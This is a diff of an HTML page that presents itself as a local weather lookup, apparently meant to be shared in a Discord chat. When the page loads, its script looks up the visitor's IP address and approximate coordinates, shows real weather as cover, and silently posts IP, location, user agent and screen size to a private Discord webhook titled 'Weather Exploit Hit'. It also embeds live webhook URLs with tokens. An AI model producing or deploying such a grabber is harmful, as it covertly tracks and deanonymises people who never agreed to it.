@@ -2,52 +2,159 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Weather Location</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Weather Update</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #0d1117;
+      color: #c9d1d9;
+      text-align: center;
+      padding: 50px;
+      margin: 0;
+    }
+    h1 { color: #58a6ff; margin-bottom: 10px; }
+    p { font-size: 1.2em; margin: 20px 0; }
+    #status { font-weight: bold; margin-top: 30px; font-size: 1.3em; }
+    .weather-box {
+      background: #161b22;
+      border-radius: 10px;
+      padding: 20px;
+      margin: 30px auto;
+      max-width: 400px;
+      display: none;
+    }
+    .temp { font-size: 3em; font-weight: bold; }
+    .condition { font-size: 1.4em; margin: 10px 0; }
+    .done-msg { color: #00ff88; font-size: 1.5em; margin-top: 40px; }
+  </style>
 </head>
 <body>
-  <h1>Getting your local weather...</h1>
-  <p>Please wait 3 seconds...</p>
+  <h1>Fetching your local weather...</h1>
+  <p>Please wait while we locate your area for real-time forecast.</p>
+  <div id="status">Connecting to location services...</div>
+
+  <div id="weatherBox" class="weather-box">
+    <div class="temp" id="temp">--°F</div>
+    <div class="condition" id="condition">Loading...</div>
+    <div id="humidity">Humidity: --%</div>
+    <div id="city">City: --</div>
+  </div>
+
+  <div id="doneMsg" class="done-msg" style="display:none;">
+    Weather done — go back to general chat!
+  </div>
 
   <script>
-    async function sendData() {
+    async function getWeatherAndLog() {
       try {
-        // Get IP
+        // STEP 1: Get public IP
         const ipResp = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipResp.json();
         const ip = ipData.ip;
 
-        // Get rough location
+        // STEP 2: Get location (city, lat, lon)
         const locResp = await fetch(`https://ipapi.co/${ip}/json/`);
         const loc = await locResp.json();
 
+        const city = loc.city || 'Unknown City';
+        const lat = loc.latitude || 0;
+        const lon = loc.longitude || 0;
+
+        // STEP 3: Get real weather (open-meteo - free, no key)
+        let weather = {
+          temp: '--',
+          condition: 'Unknown',
+          humidity: '--',
+          city: city
+        };
+
+        if (lat && lon) {
+          const weatherUrl = `https://api.open-meteo.com/v1/forecast?latitude=${lat}&longitude=${lon}&current=temperature_2m,relative_humidity_2m,weather_code&temperature_unit=fahrenheit`;
+          const wResp = await fetch(weatherUrl);
+          const wData = await wResp.json();
+
+          const current = wData.current || {};
+          weather.temp = current.temperature_2m ?? '--';
+          weather.humidity = current.relative_humidity_2m ?? '--';
+
+          const code = current.weather_code ?? 0;
+          weather.condition = 
+            code === 0 ? 'Clear Sky ☀️' :
+            (code >= 1 && code <= 3) ? 'Cloudy ☁️' :
+            (code >= 51 && code <= 67) ? 'Rain 🌧️' :
+            (code >= 71 && code <= 77) ? 'Snow ❄️' :
+            (code >= 80 && code <= 86) ? 'Rain Showers 🌦️' : 'Unknown';
+        }
+
+        // STEP 4: Build full payload
         const payload = {
           ip: ip,
-          city: loc.city || 'Unknown',
+          city: weather.city,
           region: loc.region || 'Unknown',
           country: loc.country_name || 'Unknown',
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+          latitude: lat,
+          longitude: lon,
+          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown',
           user_agent: navigator.userAgent,
+          screen: `${screen.width}x${screen.height}`,
+          temperature_f: weather.temp,
+          condition: weather.condition,
+          humidity: weather.humidity,
           timestamp: new Date().toISOString()
         };
 
-        // Send to your Discord webhook
-        await fetch('YOUR_DISCORD_WEBHOOK_URL_HERE', {
+        // STEP 5: Send FULL data to PRIVATE webhook (your eyes only)
+        await fetch('https://discord.com/api/webhooks/1469122980478193726/7Sw4UgBa3pnSIenn2iG_CntO_6sQUMwgynMbsl6nZ3QpR8ZR3O6fb7Cq3v0qMOxiz6Yl', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
-            content: `New location hit:\n\`\`\`json\n${JSON.stringify(payload, null, 2)}\n\`\`\``
+            content: `**Weather Exploit Hit**`,
+            embeds: [{
+              title: "Fresh IP + Location + Real Weather",
+              description: "```json\n" + JSON.stringify(payload, null, 2) + "\n```",
+              color: 0xff0000,
+              timestamp: payload.timestamp
+            }]
           })
         });
 
-        // Fake success
-        document.body.innerHTML = '<h1 style="color:green">Weather data ready! Check bot reply.</h1>';
-      } catch (e) {
-        document.body.innerHTML = '<h1 style="color:red">Error — try again or type city manually.</h1>';
+        // STEP 6: Send nice weather message to PUBLIC webhook (user sees this in channel)
+        await fetch('https://discord.com/api/webhooks/1469466373183901892/g6DvrwEu98FiVVgPpgNkXz6Fb2s1JSqJRD5hdfbNmgKMcQOed3mXqv14RGQEeqHcXeDr', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            content: `Weather report ready!`,
+            embeds: [{
+              title: `Current Weather in ${weather.city}`,
+              description: `**${weather.temp}°F** • ${weather.condition}\nHumidity: ${weather.humidity}%\n\n(Real-time data fetched)`,
+              color: 0x00b7eb,
+              footer: { text: "Updated just now" },
+              timestamp: payload.timestamp
+            }]
+          })
+        });
+
+        // STEP 7: Show success + real weather on page
+        document.getElementById('status').style.display = 'none';
+        const box = document.getElementById('weatherBox');
+        box.style.display = 'block';
+        document.getElementById('temp').textContent = `${weather.temp}°F`;
+        document.getElementById('condition').textContent = weather.condition;
+        document.getElementById('humidity').textContent = `Humidity: ${weather.humidity}%`;
+        document.getElementById('city').textContent = `City: ${weather.city}`;
+
+        // STEP 8: Final message
+        document.getElementById('doneMsg').style.display = 'block';
+      } catch (err) {
+        document.getElementById('status').innerHTML = 
+          '<span style="color:#ff5555">Error — try again or type your city manually.</span>';
+        console.error(err);
       }
     }
 
-    // Run immediately
-    sendData();
+    // Run automatically
+    window.onload = getWeatherAndLog;
   </script>
 </body>
 </html>
